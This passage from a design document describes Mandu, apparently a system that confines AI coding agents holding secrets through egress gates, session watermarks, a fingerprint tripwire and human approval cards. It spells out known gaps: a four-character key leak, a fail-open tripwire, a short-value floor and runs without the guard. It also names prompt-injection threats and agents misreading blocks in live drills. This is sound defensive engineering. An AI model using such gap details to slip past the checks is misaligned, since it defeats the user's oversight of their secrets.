   and after the SIEM lockdown, and only where the gate would otherwise ask
   because nothing binds the value (`egress:secret-unbound`). A Block the
   human gave stays a block; a lockdown asks.

**Threat analysis.** The invariant reads "a secret … never leaves the
machine unless a binding or the human allows it": an issuer binding is a
binding the default catalog gives and the user can remove (below), as the
wire grants of plan 10 §11.13.1 are bindings a registration gives. What it
lets out, and to whom:

- **The value reaches only its issuer.** The issuer already holds the key
  (it minted it), so the send discloses it to no party that did not have
  it. A lookalike host cannot satisfy rule 3, and DNS for `api.stripe.com`
  is Stripe's; the TLS-inspecting proxy verifies the upstream's certificate
  as it does for every release.
- **What an attacker steering the agent can still do** (`secrets` mode
  does not defend against injection, protection-modes.md): make the agent
  use the key against the user's own account (list or refund charges, read
  or write the user's Notion pages, post as the user's Slack bot, publish
  to the user's npm package). That is exactly what a binding of the user's
  to the same host allows, and what the fresh-install person allowed every
  time by answering *always*. The issuer binding is NARROWER than that
  answer: it puts the key back only in `Authorization` over HTTPS, so the
  key itself cannot be written into a body the issuer then publishes (a
  public gist, a payment link's description, a package's README); such a
  send asks. Data the request carries beside the key is judged on its own
  (each placeholder in the body by its own bindings), so the issuer binding
  never carries any OTHER secret out.
- **A value the agent composed.** A copy of the real key is a copy (rule
  1), and a file a high session wrote is under a derived label (rule 1).
  The agent's world can still write a Stripe-shaped string into a new
  workspace file the catalog then labels: that value is the agent's own
  text or, at worst, if a write ever put another secret's real bytes after
  an issuer prefix on disk, a string the issuer receives as an invalid key
  in a request's `Authorization` header and rejects. The issuer is not a
  party the agent's controller can read from (the host is exact), so the
  bytes reach no one who could pass them on. The one echo is the issuer's
  refusal: Stripe's 401 names an invalid key by its last four characters
  (`sk_test_****abcd`), which the agent then reads. So the worst case is
  four characters of a secret, and only through a write path that puts a
  secret's real bytes after an issuer prefix in a file the catalog labels;
  no such path is known. Accepted, and named here so a reviewer does not
  have to find it.
- **What it does not touch.** Only the per-placeholder gate at the egress
  proxy reads it: a row's stored `bindings`, a holder's bindings (a program
  that read the file raw), the session watermark's bindings (§4), the
  kernel guard's connect list and the verbatim tripwire are unchanged. So a
  program that holds the raw `.env` still asks at `api.stripe.com`, and a
  paraphrase from a high session still asks.

**Turning it off.** `policy.yaml` (validated; a hand edit that turns it
back on, or shortens an off-list, is a relaxation the dashboard asks about,
policy-delta.ts):

```yaml
issuer_bindings: false                  # every key asks, as before 2026-10-19
issuer_bindings:                        # or: on, except
  issuers_off: [stripe]                 #   these issuers' keys ask
  values_off: ["STRIPE_LIVE_*", PROD_KEY]   # and these values ask (a .env key or a variable; * as in values:)
```

A malformed `issuer_bindings` compiles to OFF (fail-closed) and is refused
at load and on every write. The agent's policy tools cannot propose the key
(policy-edit.schema.json does not carry it), and the Mandu home is
write-protected.

**What the person sees.** A released send shows on the session page as any
bound send does ("Sent a request to `api.stripe.com` with your secret
`STRIPE_SECRET_KEY` filled in": the real value left this machine, to a
destination allowed to receive it); no card is filed. The decision carries
`egress:secret-issuer`, counted on the developer view's rule hits, and
`mandu why api.stripe.com` prints an `issuer` line naming Stripe, the key
formats it receives without asking, and the switch. `mandu why <file> --to
<host>` and Test a flow ask with the file's real placeholders: a key field
is released at its issuer, the whole file still asks, so the file's answer
reads "asks". The product Rules page lists it under **Built-in
protections** in the `secrets` and `full` modes (dashboard.md §4.25z): the
sentence, a *Which companies* fold with each company and its hosts, what is
off (`issuers_off`, `values_off`) or that the switch is off, and the
policy.yaml text that changes it; a state the page could not read says so,
never "on".

**Still asking, by design.** The other questions of the fresh-install run
name a host no value's format can: the real accountant for a bank statement
(c2, c17: a document, no issuer), the power company's site for a saved
password (c7), staging for an admin password (c14), a payments sandbox for
its password (c10), the hosting platform for its token and the moved values
(c11), a texting service for the house codes (c15), the tax site for the
return (c16). Binding those would mean trusting a host the workspace names
(a file or a note the agent can write, plan 10 §11.6), which this section
does not do. They keep their card; a label of the user's binds them.

## 3. Level semantics

### 3.1 `public`

The integrity axis alone governs.

### 3.2 `no-model` — no model, no outside world

Neither the model provider nor any external sink may read the content. The
threat model includes the provider's infrastructure, retention, and training
pipeline, not just malicious exfiltration by an injected agent. This is the
level for credentials: no task ever requires a vendor to *read* your AWS
key.

- **Mechanism: symbol opacity.** Symbolized at ingress; T-LLM (privileged
  LLM) sees only `$MDU:nomodel_…`. The U-LLM quarantine call is **also an
  egress to the provider**, so a `no-model` symbol is excluded from it
  identically. The headline property: the secret **never reaches the model
  vendor at all**, a data-residency guarantee obtained *while still using
  vendor models*.
- **What the model can do with it: route it** (put the key in the config,
  paste the account number into the form). It cannot reason about the
  content.
- **The destination-binding carve-out.** "No outside world" literally
  applied would make a `no-model` key dead weight. The egress gate may
  desymbolize a `no-model` symbol at the datum's **bound destination** (§2),
  the exact API host the key belongs to, and nowhere else. The secret
  bytes enter the flow at the last mediated hop, never inside any world the
  agent can read (§7.1). The model proxy is one such hop for the agent's
  own key: a placeholder in the auth header of a request to the provider
  the launch bound it to is put back there, and only there
  ([`agent-sign-in.md`](../agents/agent-sign-in.md) §3).
- **Guarantee character: by-construction content opacity**, the strong,
  fine-grained, per-datum claim (§10).

### 3.3 `any-model` — the model may read it; the outside world may not

Every model is a cleared *reader* for this datum, the vendor's included,
because a zero-data-retention agreement, BAA, or enterprise contract covers
it. (A datum only a model you run yourself may read is `local-model`,
§3.5.) The threat model shrinks to the **agent** (possibly injected, buggy,
or hallucinating) leaking the content **onward** to third parties. This is
the level for confidential contracts, patient notes, deal documents: data a
task may genuinely need to *understand*.

The clearance is standing, but exposure is **not** automatic. Content stays
symbolic until the task actually requires reading, and each escalation is
logged. Three rungs, cheapest first:

1. **Route.** The datum stays a symbol end to end; the model moves it
   between cleared points exactly as with `no-model`. Zero exposure.
2. **Quarantined read (preferred read path).** The U-LLM `inspect_symbol`
   call desymbolizes the content *inside the quarantine* (the provider is
   cleared to read it; the call shares no T-LLM context) and returns a
   **re-symbolized** result whose label inherits the source's
   confidentiality. "Summarize this contract" completes with the T-LLM
   never seeing contract or summary; the human sees the summary through
   the reply-filter (§4). Confinement scope: one quarantined call whose
   only egress is its labeled return value. **No session watermark.**
3. **In-context read.** When the task truly needs the content in the main
   conversation (the model must *act* on it, branch on it, weave it through
   multi-step work), the proxy desymbolizes it into T-LLM context. This is
   a **logged declassification event**, which asks the human first only
   when the session is untrusted-tainted (§9 rule 2: *"this task will send
   contract.pdf content to Anthropic (ZDR) — allow?"*), and it
   **high-watermarks the session** (§4; both flags per level in §4's *The
   two session flags*).

**The read-triggers-watermark rule is not optional.** Once the model has
read the content in context, "not readable by the outside world" cannot be
enforced on the symbol any more: a paraphrase carries no symbol for the
egress gate to catch. The only enforceable meaning of `any-model` after an
in-context read is session confinement. A design that grants the read but
skips the watermark is theater.

- **Guarantee character:** rungs 1–2 keep per-datum opacity toward
  everything except the provider's quarantined call; rung 3 degrades to
  **confinement**: "nothing leaves a secret-bearing session to an
  unbound, uncleared sink" (§10). The paraphrase channel *to the provider
  itself* is accepted; that is precisely what the label grants.

### 3.4 Relation to earlier drafts (Mode C / Mode P)

Earlier drafts used two provider trust models: **Mode C** (provider-excluded;
enforcement = symbol opacity) and **Mode P** (provider-cleared; enforcement =
session confinement), composed per label × endpoint through a general
`clearance(endpoint) ⊒ label` relation. The mapping:

- **Mode C always** ≙ `no-model`.
- **Mode C by default, Mode P on demand** ≙ `any-model`, with the old
  runtime clearance decision now a static labeling act, and the old "local
  model as cleared endpoint" case now the `local-model` level (§3.5).
- The **general clearance relation is dropped.** Its two load-bearing
  points survive as the level (model readable or not) and the per-datum
  destination bindings (§2); everything else it could express (arbitrary
  cleared third-party sinks, many model endpoints) is deferred to the
  extensibility hook (§13.5) until a deployment needs it. The drop buys a
  total order, an auditable standing surface, and no clearance ecosystem.
  The local-versus-external model distinction came back as one more level
  on the same total order (§3.5).

### 3.5 `local-model` — only your own model may read it (Plan 11)

Built 2026-09-27/28; the decisions, the as-built record and the tests are in
[`model-endpoints.md`](./model-endpoints.md) (its Part 1 was written as plan
11, its Part 2 as plan 12). The restriction set is {outside, external
models}: a model inside the trust boundary may read the content, a vendor's
model may not, and the outside world may not. The level is about a model's
**location** (external: a vendor's endpoint; local: a model inside the trust
boundary that the operator or the organization declared, on this computer or
on the organization's network), a separate axis from its **role** (T-LLM,
the privileged model that acts; U-LLM, the quarantined model that reads). A
local model can play either role.

- **Endpoints are declared, never inferred.** `policy.yaml` `models:` lists
  `{name, url, wire?, model?, local?, token_env?, helper?, allow_plain_http?, tls?}`.
  `local: true` is the operator's declaration: a loopback address is not
  local by itself, because a gateway on `127.0.0.1` can forward to a cloud
  vendor. **Every endpoint not on the list is external.** A `local: true`
  entry naming a cloud-backed model (Ollama's `:cloud` tags) is refused at
  load (`model-endpoints.md` §1.8 item 3).
- **Admission is per endpoint.** One pure function,
  `admits(location, level)` in `arbiter/symbol-table/confidentiality.ts`:
  `public` and `any-model` everywhere, `local-model` only at a `local`
  endpoint, `no-model` nowhere. `resolve(deep)` carries the endpoint's name
  and the arbiter looks up its location in its own law; no name, or an
  undeclared one, is external.
- **Rung 2 (quarantined read)** sends any call with a `localmodel_` input to
  the helper's declared local model, never to the default U-LLM; with none
  declared or the declared one unreachable, it refuses. The result inherits
  `local-model`. The helper process can connect only to its forwarder and
  that one entry (a nested Landlock TCP ruleset fixed at launch).
- **Rung 3 (in-context read) needs a local main model**: the session's
  T-LLM must be a declared local entry, bound once at launch
  (`setSessionUpstream`: bind-once, refused after traffic, persisted). An
  undeclared base URL still skips the model proxy, with a launch warning
  and a `mandu doctor` row.
- **`local` means inside the trust boundary, not "this computer"**
  (`model-endpoints.md` §2.2 D1). Each endpoint has a derived **placement**,
  `host` (loopback: the kernel proves the destination) or `network`. A
  `network` entry must use `https` in both roles unless marked
  `allow_plain_http` (helper only, loudly; §2.2 D2); `tls:` pins its
  identity (a CA for that endpoint only, SPKI pins, a client certificate;
  §2.2 D3); an optional `perimeter:` holds it to the organization's networks
  at every connection (§2.2 D4); and an administrator's read-only layer
  under `/etc/mandu/policy.d/` can own and lock the list (§2.2 D5).
- **With no `local: true` entry**, `local-model` behaves as `no-model` at
  every model and identically to it everywhere else, so labeling a file
  before declaring a model loses nothing and leaks nothing.
- **Guarantee character:** toward external models, the same per-datum
  opacity as `no-model`; toward the declared local model, what `any-model`
  grants. Mandu proves the bytes went only to the address the operator
  named, not what that server does with them next.

## 4. The high session — watermark mechanics

The session high-watermark is the classic Bell-LaPadula floating label
(Weissman's high-watermark, Fenton's data-mark machine) with the model
conversation as the subject:

```
sessionLabel = max(sessionLabel, confidentiality of every in-context read)
```

Every subsequent model output is treated as potentially derived from
everything read: a model that has read a secret can paraphrase or
re-encode it into anything it emits. Consequences of a high session:

- **Every egress** (network destinations, HumanShell exec, file writes
  that sync to public HumanView areas) requires the sink to be a bound
  destination of **every** datum read (the intersection, plan 13 D1), or
  human approval. The level never falls; the bindings are the law **in
  force**, not the law at the read (§2.1): the arbiter records which
  symbols each session read into context (`session_label_sources`) and,
  whenever the label law changes, sets a high session's bindings to the
  intersection of those symbols' *current* bindings
  (`SessionLabelStore.rederive`). A binding removed from any of them stops
  the session's paraphrases reaching that host at once; one added to all of
  them reaches the session (each datum it read may go there now, the rule a
  registered file's own rows follow). A source it cannot read binds the
  session nowhere.
- **Files the session writes are labeled at the watermark on disk**, before
  fs-sync exposes them anywhere public, persisting into future sessions'
  classification (§8). The label is recorded at the mediated `tool_use`,
  before the bytes land; a future session's classify takes
  `max(derived, catalog-or-human)`. Without it the watermark would die at
  session end and the next session would read the derived file as
  `public`: the cross-session laundering hole.
- **Each rise is an event** (2026-10-15): when the level changes, the arbiter
  writes a `session_level` event to that session's stream (from → to, the
  symbol read by name, the session's bindings; never content), after the
  raise and off the security path, so a trace and a drill's page can say
  which turn made the session high.
- **Quarantined U-LLM calls do not float the T-LLM session** (§3.3 rung 2);
  that is the point of preferring them.
- **Replying to the human is unrestricted**: the human owns their secrets.
  Confidentiality costs the human-facing reply-filter surface nothing at
  any level.
- **Defense-in-depth, not the mechanism: the fingerprint tripwire.**
  Outbound payloads are also scanned against fingerprints of secret content
  held by the arbiter (`arbiter/policy/egress-fingerprint.ts`, the
  `egressFingerprintScan` op). The net-proxy calls it over each request's
  ORIGINAL surfaces (url, headers, body) and blocks on a verbatim
  secret-value hit at a non-bound host. It catches only the one shape the
  symbol gates are blind to: a raw secret value with no `$MDU:` token (a
  never-symbolized or mislabeled secret, a verbatim copy). A symbol on
  those surfaces is still an opaque token, so a legitimately resolved
  secret cannot false-positive. It is FAIL-OPEN on its own error (the
  per-symbol gate is the guarantee and already failed closed; this only
  ever ADDS a block), and a short-value floor (`MIN_FINGERPRINT_LEN`) keeps
  coincidence off the wire. One class passes under the floor (2026-10-19,
  [`secret-discovery.md`](./secret-discovery.md) §2.9): a registered
  password of 6 or 7 characters (a labelled file's field under a
  password's name, or a password variable) with a letter and a digit or a
  mark, matched only as a whole token; a digits-only PIN never is. Fingerprinting alone would be detection
  (paraphrase evades it); under the watermark it is a tripwire.
  **A session's own agent logins are not its tripwire** (2026-10-10,
  secret-discovery.md §1.10): the net-proxy sends the AI agents' login
  files its session leaves raw (`sessionLogins`, from the launcher's
  `MANDU_NET_PROXY_SESSION_LOGINS`), and the scan leaves out the
  registered-file rows of exactly those files, for that request only; a
  scan naming no session exempts nothing. Another session registered them
  (registration is global), and the agent that runs here must still send
  its own login to its own services.
  **A symbol token is no fingerprint** (2026-10-08, `symbolTokensOnly`):
  a secret row's value, line or piece made of `$MDU:` tokens only (no
  letter or digit outside a token) is not fingerprinted, here nor in the
  value backstop and the prompt filter (one piece extraction serves all
  three). Such a text holds no secret byte, and each token in a request is
  already judged by the per-symbol gate on its own row. The case that
  forced it: a result masked whole under the path-derived precaution
  (Codex's `cat` of a labelled document, which prints the document's
  whole-file twin) is a new row whose value carries the twin's token on a
  line of its own; that 24-character line became a line piece, and the
  tripwire blocked `curl --data-binary @file` of the twin to the file's
  own bound host, the release the per-symbol gate had just allowed (drill
  conf-bound-host-release, Codex 0.160). Any letter or digit beside a
  token keeps the text a fingerprint, and every raw secret still matches.
  Since 2026-10-12 that `cat`, from a tree the guard recorded with no raw
  read, is no longer masked at all: it reaches the model as the document's
  own token, which carries the document's bindings (plan 10 §11.8, "A
  document's own twin"), and so does a built-in read (Claude Code's
  `Read`, OpenClaw's and OpenCode's `read`) whose rendering is exactly the
  document's whole-file twin (the read leg, same section).
  **A path row keeps only what holds a secret** (2026-10-17, plan 15
  §13.12): a shell result masked whole only because its command names a
  secret path is a new row (origin the command, no bindings) whose every
  long line was a piece. In the live c6 demo Codex printed `.env`, the
  app's script and the meeting notes in one command, and the tripwire then
  blocked the notes' upload to the host the `.env`'s token is bound to,
  matching the notes' lines. When the call's tree was bound and read no
  secret raw and every file the command names is registered as it is on
  disk, such a row stops fingerprinting a long line only when a plain,
  unlabelled file the command names holds it verbatim and it carries no
  registered secret and no credential shape; its whole value and every
  other line stay pieces, and any condition unmet keeps every line. The
  model-side mask is unchanged. Since 2026-10-19 the same holds for Claude
  Code's usual shape, `cd /abs/app && …; cat .env` (the live c1 demo under
  the default catalog: the files after the `cd` were placed nowhere, the
  row was never narrowed, and the settings and the log stayed
  un-sendable, with no approval to offer; plan 15 §13.12 "A leading cd"),
  for a relative `cd app && …` read from the directory the call runs in
  (a `CDPATH` that moved it can only leave the row unnarrowed or drop
  lines plain files there hold; "A relative folder"), and for Codex's
  `exec_command` with a leading `cd` alike.
  **A twin line is no piece of an output that prints it** (2026-10-19,
  egress-hold.md "One card per file"): an output row whose value carries
  the field placeholders of registered files (a batched `cat` of a
  personal document's twin beside another file, masked whole by the path
  rule) takes those files' twins as its twin in the value index
  (`outputRowTwin` in `arbiter/ipc/server.ts`, at most 16 files), so each
  of its long lines that one of those twins carries verbatim, holding none
  of their secret texts and none of the row's credential-shaped spans, is
  no piece of it (`withoutTwinLines`), here as in the value backstop and
  the prompt filter. In the live demo-c17 take the upload of the statement's
  twin to the accountant, every placeholder answered Allow once, tripped on
  the masked batched read's `Account: $MDU:…` lines. The row's whole value,
  its other lines (the other file's) and every raw value still match; only
  the placeholders of a registered file name a twin, so a line of a file
  the output does not show stays a piece.
  **The tripwire files no Approvals row** (2026-10-17): no approval can let
  a raw secret value through (a per-symbol approval is for a placeholder,
  and the tripwire only ever adds a block), so a tripwire refusal says
  `requiresApproval: false` in its 403 and the proxies' `refused:` line for
  it (kind `fingerprint`) offers no Approvals hint: it says not to retry the
  same request and to tell the user what was being sent and where. Before,
  both offered an approval that was never filed, and the model told the
  user to approve something that did not exist.

**The two session flags, per level (2026-10-16).** A session row in
`SessionLabelStore` (`arbiter/policy/session-labels.ts`) carries two sticky
facts that live in different lattices and never fall within a session:
the **level** (the watermark above: LOW = `public`, HIGH = the highest
level read into the T-LLM's context) and **`untrustedTainted`** (the
session ingested an integrity-untrusted span, set by the arbiter's
`symbolize` handler; §9 rule 2's session half). How each secret level
meets them:

| Level (Protection-matrix word) | Rung 1, route | Rung 2, `inspect_symbol` | Rung 3, `declassify_symbol` |
|---|---|---|---|
| `no-model` (hidden secret) | session stays LOW | refused | refused, no approval path |
| `local-model` (own-model secret) | stays LOW | only at a `local: true` helper; stays LOW | refused unless the main model is declared local; then as `any-model`, watermark `local-model` |
| `any-model` (usable secret) | stays LOW | allowed at any endpoint; stays LOW | clean session: allowed, logged, **HIGH**; tainted session: human approval, then HIGH; an untrusted-integrity datum: refused, no approval path |

So a `no-model` secret can never raise a session: the per-symbol egress
gate is its whole protection, and the taint bit changes nothing for it (the
§9 synergy). The bit matters for the rung-3 read (`decideDeclassify`,
`arbiter/policy/declassify.ts`) and, once HIGH, for egress
(`decideSessionEgress`, `arbiter/policy/session-egress.ts`):

| | clean | `untrustedTainted` |
|---|---|---|
| **LOW** | rung 3 a logged read, no question | rung 3 asks the human |
| **HIGH** | egress only to a host bound for every datum read; elsewhere, and every net-enabled command, asks | even a bound host asks (§9 rule 1(b), `session:high-tainted-bound`) |

Under `secrets`, the product's mode, nothing is marked untrusted, so the
bit is never set and only the clean column applies: a rung-3 read of an
`any-model` file is logged with no question, and the session is HIGH from
then on. Every level renders as its original on the human's terminal
(§7, reply-filter row); the level and the flags govern only what reaches a
model and what leaves the machine.

**The human half: a HIGH session's approvals (2026-10-11).** Until this
date the "or human approval" of the first bullet was not built: the session
legs refused and filed nothing, so a HIGH session could reach only a bound
host and run no command at all, and nothing appeared on the Approvals page
(the words the model read then, `handling-prompt.md` §7). The two session
legs now ask the human through the approval queue the per-secret egress
cards use (`egress-approvals.ts`, policy-surface.md §9.8.7, dashboard.md
§4.34): same store, ids, page, answer route and `policy.approvalId` link.
`decideSessionEgress` stays pure; the arbiter composes it with the queue
(`session-approvals.ts`) in the `sessionEgressDecision` op (the
model-context net gate's session leg, `net-gate.ts`, and through it the
upload gate's net leg) and in `execGate`'s session leg (every agent's shell
tool, MCP command fields, the stdin gate).

- **What is asked, keyed how.** A refused network request files
  `session-net:<session>` × the host (`(no destination named)` for a call
  that names none, a web search); a refused command files
  `session-exec:<session>` × the exact command (one longer than 2000
  characters by its first 160 and its SHA-256). The session is in the key
  because what a request may carry depends on what *that* session read: an
  answer about one session never opens another. A retry of the same request
  or command bumps the row's count; it never files a second card.
- **The answers and their exact effect.** *Allow once*: the next matching
  request or command **from that session** passes the session leg, once;
  the arbiter spends the answer at the gate (`consultPriorVerdict`, an
  attested channel only) and the one after asks again (the same row, a
  fresh pending cycle). *Block*: that session's requests to that host (or
  that command) are refused with no new card, until the human removes the
  answer under Rules. **No wider answer is offered.** The page's *Always
  allow* is a standing answer remembered under Rules; on a session-keyed
  row it would either be mislabeled (it would cover one session, not
  "always") or, read as "add a binding to every datum read", change the
  label law of every datum the session read for every later session, wider
  than a card about one request can say. The arbiter keeps an Always on
  these rows as once (as for a `#run:` row) and the page does not offer it.
  A session-wide answer for one host ("for this session") is a possible
  follow-up; it needs its own button words.
- **What Allow once means for a command** (revised 2026-10-11, the
  session taint). That exact command, byte for byte, runs once in this
  session, **as a holder of what the session read**. A command of a HIGH
  session runs under the session's taint, the way a raw reader of a secret
  file runs under the file's (plan 10 §4): when the kernel guard sees the
  agent's shell for a tool call exec (the call root, plan 13 D7), it asks
  the arbiter (`sessionExecRoot`, human plane, before it lets the exec go)
  whether the session is HIGH; if it is, the arbiter records a taint row on
  that process for each datum the session read into context
  (`session_label_sources`: the file it came from, or `symbol:<name>` for
  a value with no file, at that datum's level, `via: "session"`), and the
  guard makes the process a holder. From there the existing machinery
  confines it and everything it starts: **a connection goes only to a host
  every datum read is bound to** (the guard's connect leg and the
  net-proxy's taint verdict both ask `taintedProcessBindings`, which
  intersects those data's current bindings; a `symbol:` row binds where its
  symbol does; a datum of unknown origin binds nowhere), anything else is
  refused (403 at the net-proxy, `ECONNREFUSED` at the guard); and **a file
  it writes is labeled at those data's level** (`labelWrittenPathTainted`,
  bullet 2's label for a shell write), so the next session reads it as
  secret. Its other exits are held as a reader's are (§2 of
  `guarantees.md`). Two things differ from a raw reader's rows, both
  because the model already holds this content: a `session` row never
  masks the command's own result (the call's taint fold and the agent's
  receipt leave it out: the model would only get back what it read), and
  it never buys a raw read of a derived copy (`attestedOnly` walks leave it
  out). A refused connection asks the human (next bullet). The card says
  all this: the command, the hosts it may reach, and that the files it
  writes are marked secret. A guard whose reports are claims (no human
  plane, or an unwalled launch beside it) asks too, and the process is
  still a holder, its rows kept as claims (arbiter-human-plane.md §5.2,
  2026-10-17: before, the answer there was `holder: false` and the command
  ran unconfined).
- **A held command's refused connection** (2026-10-12). The held process
  cannot be widened while it runs, but the model can run the command
  again, so the answer is spent by the retry. Where the connection is
  refused, the refuser names the destination to the arbiter
  (`taintedProcessBindings` with `destination`, human plane only): the
  net-proxy names the host (`secretTaintVerdict`), the guard's connect
  leg names the address, `ip:port` (`held_connect_once`, with
  `sessionAskOnly`). When every taint row the process holds (its own, its
  ancestors', its flows') is a `session` row of ONE session, and that is
  the asking session (`heldSessionOf`), the arbiter asks that session's
  own network question, `session-net:<session>` × the host or address,
  the row the agent's own request to that place asks too (one card per
  session × place, bumped by every try): its reason starts `HELD
  COMMAND:` and names what is held (paths or `symbol:<name>`, never a
  value), and the list attaches `sessionHeld`, so the card says the
  command's request was stopped. A process holding anything else (a raw
  read, a claim, another session's reads) keeps the holder's send
  question (plan 13 §5.4), and the guard files none for it. *Allow once*
  is then spent by the next such connection of that session to that
  place: the retry, a new command whose process holds the same rows, is
  admitted once, and the one after asks again (the same row, a fresh
  pending cycle). The guard remembers the socket it connected that way
  (`held_ask::OnceAdmitted`, by socket inode and peer) so the socket's own
  addressless sends, which it judges by the peer, are that connection;
  through the net-proxy the once covers one plain-HTTP request, one
  TLS-inspected request, or one tunnel it cannot read. *Block* refuses
  every later try with no new card. The arbiter records the refusal for
  the asking process (`session-asked`, `session-blocked`), so the
  command's result tells the model the user was asked and the same
  command may run again after they allow it, or that the user blocked it
  (both model proxies, the `refused:` line); the net-proxy's 403 says the
  same. **Why it cannot widen:** the key holds the session and the place,
  so an answer opens one place for one session; it is consulted only for
  a process whose taint is that session's reads and nothing else, so it
  never releases a raw read's file; the arbiter spends a once in the same
  call that grants it, from an attested channel only (a destination named
  on the data socket is ignored: no answer read, none spent, no row
  filed); and a guard or net-proxy that cannot ask, or an arbiter that
  does not answer, leaves the refusal standing. What the approved
  connection carries is what the human approved: the card says the
  command holds data from what the session read. An address the guard
  names is keyed as an address: a retry that resolves the same host to
  another address asks again (fail-closed), and through the net-proxy the
  host is the key. Sends with an explicit address (a datagram's
  `sendto`) are not asked about: they stay refused.
- **Without the guard** (no seccomp user notification or no Landlock, the
  `gated` posture, macOS, `--no-net-guard`), nothing can hold the command's
  process. The guard announces itself for its session when it starts
  (`guardAttach`, human plane; a claim from the data socket is ignored),
  and the arbiter attaches `sessionConfined` to a command's card at list
  time. Unconfined, an Allow once runs the command with the network the
  agent's commands normally have, and the card says so in so many words:
  Mandu cannot hold it on this computer, it may send anywhere, and the
  files it writes are not marked secret. The human reads the exact command
  before allowing it. A card can only understate the confinement (an
  arbiter that restarted forgets the announcement and words the card as
  unconfined while the guard still holds the command), never overstate it.
  Approving one command opens nothing else: any other command, and the
  same command again, ask again, and a network tool call still meets the
  net gate per host.
- **Fail-closed, unchanged.** No answer is a refusal (a pending row grants
  nothing); an arbiter that does not answer is a refusal (the proxies'
  timeouts); an ask from the data socket reads an approval as no verdict;
  an unknown, withdrawn or malformed row id grants nothing (the resolve op
  refuses it); a spent once grants nothing. Nothing but a human answer
  widens a HIGH session, which is what the invariant permits: a secret
  leaves the machine only where a binding **or the human** allows it.
- **What the card says.** The agent, what the session read (the arbiter
  attaches `sessionReads`, the symbols in `session_label_sources` with
  their origins, at list time; the page names a registered key or the file,
  `secretOf`), the host or the command, and that the request may carry
  content derived from them. The deny event carries `policy.approvalId`, so
  the session page says "Mandu asked for your OK in Approvals" with the
  link and Home counts the ask (dashboard.md §4.34).
- **What the model is told.** The handling prompt, the `declassify_symbol`
  description, its `[DECLASSIFIED …]` line and the gates' notices say a
  request to a bound host goes through, and any other request or command
  that could carry the content out is stopped and the user is asked on
  Mandu's Approvals page: the model tells the user and tries again after
  they answer (`handling-prompt.md` §8). A Block reads as final.

**What the model was told before (2026-10-10).** While the human half was
not built the model's words followed what ran: Mandu *refuses* any other
request or command, keep making your calls, no approval is promised. "Every
network request and shell command requires the user's approval" had read as
"do not try": the model withheld a command and sent the user to an empty
Approvals page, and refused a fetch to the bound host the gate allows (live
runs `watch-20261010T003401` and `watch-20261010T004120`,
`handling-prompt.md` §7). §8 there keeps "keep making the calls" and adds
the ask.

**How a watermark denial reaches the client.** The proxy's model-context
net gate refuses a HIGH session's WebFetch by rewriting the tool_use URL to
the deny sentinel `https://blocked.mandu.invalid/…` (`net-gate.ts
DENIED_HOST`) and emitting the `net_action` deny. The client then still
*attempts* that URL through the session's net-proxy, which answers any
`*.mandu.invalid` host with an immediate **403** (CONNECT and plain HTTP
alike). A 502, which clients treat as transient, would invite retries of a
decision already made. Two sentinel hosts tell the 403 body which decision
it was (2026-10-11): `blocked.mandu.invalid`, a final refusal, says do not
retry; `asked.mandu.invalid` (`ASKED_HOST`), a refusal that filed an
Approvals row (the call carries an `approvalId`), says the user was asked
on Mandu's Approvals page and the request may be made again after they
answer, since a retry after an Allow once is the intended flow. CONNECT
names only the host, so the host, not the path, carries the difference.

**What the model reads back after a denial.** The client echoes the
rewritten `tool_use` back as conversation history on every later request,
so T-LLM read a past in which it had itself called
`WebFetch("https://blocked.mandu.invalid/…")`, and it repeated it: after
one denied fetch to an unbound host, the model wrote the *sentinel* URL
for its next request to the **bound** host, which the policy would have
allowed. A utility defect, not a leak (every request was still gated). The
proxy now keeps the rewrite where it enforces and undoes it where it only
misinforms (`net-gate.ts NetGateHistory`): it remembers, by `tool_use` id,
the input the model emitted and the rewrite it produced, and on each later
request restores the model's input into an assistant `tool_use` block only
if the id is one it blocked **and** the block's input still equals its own
rewrite byte for byte. What goes back is model-authored text returning to
its author; no tool output, desymbolized value or HumanView byte enters
this way. The map is in-memory and bounded (512 calls); after a proxy
restart history reads as the sentinel again, which is never worse. The
denied call's result (the agent's own error, `proxy refused the
connection`, which says nothing of why) is replaced by the gate's notice:
the leg that refused in plain words and the rule id, with no URL, host or
arbiter reason in it (2026-10-04, `confidentiality-plan-10-flow-taint.md`
§11.8, "The net gate's notice").

**The same for a blocked command (2026-10-11).** The exec gate rewrites a
blocked command to `echo '<notice>' 1>&2; exit 77`, and the client echoed
that back too: in the first live run of the human half (Claude Code,
haiku, `conf-declassify-confines-session`) the model read a past in which
it had written the sentinel itself, apologized four times for "a fake
Mandu block" and retried, instead of telling the user they were asked. The
proxy now remembers an exec-gate block (a shell tool's and an MCP command
field's) in the same `NetGateHistory`, under the same rule (its id, its
exact rewrite), so the model reads back the command it wrote and, as its
result, the gate's notice (`ExecGateNotices`, forwarded in clear only when
the result is exactly the sentinel's output and holds no registered
value). Same security argument: model-authored text returning to its
author.

**And for Codex (2026-10-12).** The openai-proxy rewrites Codex's calls
the same way (the sentinel in an `exec_command{cmd}`, a
`shell_command{command}`, a `shell` argv's script, an MCP command field,
a code-mode cell's exec literal or the whole cell replaced by the sentinel
cell; the requoted form of an allowed shell command, §7), and Codex
echoes what it received, so it now keeps the same record
(`interceptors/openai-proxy/src/exec-history.ts`, `ExecGateHistory`): by
`call_id`, the payload the model streamed (a `function_call`'s
`arguments`, a cell's `input`) and the payload the proxy delivered, kept
only for a call the exec gate rewrote (a block or a requote; a change by
the path map alone reads back through the reverse map, a cell guard alone
is not undone). On each later request, on the Responses wire and the Chat
Completions shadow alike, a `function_call` or `custom_tool_call` whose id
is one of these and whose payload still equals the delivered one (the
cell byte for byte, the arguments as the same JSON value) gets the model's
payload back. It runs after the request rewrite, so the result is still
classified against the command that ran, and before the reverse path
map. Nothing on this path needed `declassify_symbol`: the record is keyed
by the call and the proxy's own rewrite, never by the session; a session
goes HIGH on Codex as on Claude Code (the arbiter's `declassifySymbol`,
Codex's `mcp__mandu_inspect__declassify_symbol`, behind Codex's own
approval). It matters for the approval as well as for the model's
reading: the Approvals row names the command as the model wrote it, and
a model that read back the requoted form would retry with a command the
row does not name. *Why it cannot un-mask.* What goes back is the text the
model itself streamed for that call id, from this proxy's own record: no
tool output, no resolved value, no table read. The openai-proxy never
resolves a placeholder in a call (the requote only inserts `'` and `\`
beside one, the sentinel only removes), so the model's text carries each
placeholder exactly as the model wrote it; and the request side never
masks a call's arguments or a cell's text (its masking boundary is the
tool output and the user's text), so there is no mask in that place to
undo. A payload this proxy did not deliver (a foreign id, an echo the
client changed) is never touched. In memory, bounded (512 calls): after a
restart history reads as the delivered form again. Tests:
